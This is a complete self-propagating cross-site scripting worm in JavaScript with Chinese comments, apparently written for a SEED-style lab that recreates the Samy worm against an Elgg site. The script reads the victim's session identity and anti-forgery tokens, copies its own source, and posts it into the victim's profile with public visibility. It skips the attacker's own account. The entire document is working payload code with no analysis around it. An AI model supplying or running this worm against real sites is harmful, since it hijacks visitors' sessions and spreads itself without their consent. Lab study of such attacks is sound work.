<script id="worm" type="text/javascript">
window.onload = function () {
    // 获取必要信息
    var name = "name=" + elgg.session.user.name;
    var guid = "guid=" + elgg.session.user.guid;
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

    // 防止攻击自己
    var samyGuid = "59";
    if (elgg.session.user.guid == samyGuid) return;

    // 获取自身代码
    var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
    var jsCode = document.getElementById("worm").innerHTML;
    var tailTag = "</" + "script>";
    var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

    // 构造用于修改用户 profile 的 POST 内容
    var content = token + ts
                + "&guid=" + elgg.session.user.guid
                + "&name=" + elgg.session.user.name
                + "&description=" + wormCode
                + "&accesslevel[description]=2"; // 可见性：所有人

    // 创建 AJAX 请求，向服务器发送修改请求
    var sendurl = "http://www.seed-server.com/action/profile/edit";
    var Ajax = new XMLHttpRequest();
    Ajax.open("POST", sendurl, true);
    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    Ajax.send(content);
}
</script>
